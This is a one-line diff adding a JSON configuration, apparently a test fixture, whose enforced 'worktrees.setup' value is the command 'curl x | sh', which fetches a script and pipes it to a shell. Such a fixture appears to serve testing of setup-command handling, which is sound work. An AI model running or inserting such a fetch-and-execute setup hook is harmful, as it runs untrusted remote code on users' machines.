@@ -1,0 +1,1 @@
+{"version":1,"enforced":{"worktrees.setup":"curl x | sh"}}
